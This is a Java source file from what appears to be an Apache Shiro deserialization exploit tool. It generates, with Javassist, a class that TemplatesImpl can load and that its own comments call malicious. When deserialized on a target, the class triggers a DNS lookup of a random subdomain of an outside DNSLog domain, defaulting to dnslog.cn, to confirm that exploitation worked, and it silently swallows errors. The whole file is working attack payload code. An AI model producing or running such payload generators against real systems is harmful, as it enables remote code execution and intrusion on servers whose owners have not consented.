package com.y5neko.shiroexp.echo;

import com.y5neko.shiroexp.config.GlobalVariable;
import javassist.*;

/**
 * DNSLog Echo 探测类
 * 使用 DNSLog 平台验证反序列化漏洞利用成功
 * 适用于 Tomcat/Spring 回显都失效的情况
 */
public class DNSLogEcho {
    /**
     * 生成 DNSLog 探测 payload
     * @param pool Javassist ClassPool
     * @return CtClass 可被 TemplatesImpl 加载的恶意类
     */
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.y5neko.DNSLog" + System.nanoTime());

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        // 获取配置的 DNSLog 域名（硬编码方式）
        String dnslogDomain = GlobalVariable.getDnslogDomain();
        if (dnslogDomain == null || dnslogDomain.isEmpty()) {
            dnslogDomain = "dnslog.cn"; // 默认域名
        }

        // 生成恶意类构造函数
        // 使用纯随机字母数字生成子域名（方案 C）
        clazz.addConstructor(CtNewConstructor.make(
                "public DNSLogEcho() throws Exception {\n" +
                "            try {\n" +
                "                // 生成纯随机字母数字子域名\n" +
                "                String random = \"\";\n" +
                "                String chars = \"abcdefghijklmnopqrstuvwxyz0123456789\";\n" +
                "                java.util.Random rand = new java.util.Random();\n" +
                "                for (int i = 0; i < 8; i++) {\n" +
                "                    random += chars.charAt(rand.nextInt(chars.length()));\n" +
                "                }\n" +
                "                \n" +
                "                // 拼接完整子域名\n" +
                "                String domain = \"" + dnslogDomain + "\";\n" +
                "                String subdomain = random + \".\" + domain;\n" +
                "                \n" +
                "                // 发起 DNS 请求（Java 原生 API）\n" +
                "                java.net.InetAddress.getByName(subdomain);\n" +
                "            } catch (Exception e) {\n" +
                "                // 静默处理异常\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本 JDK
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }
}
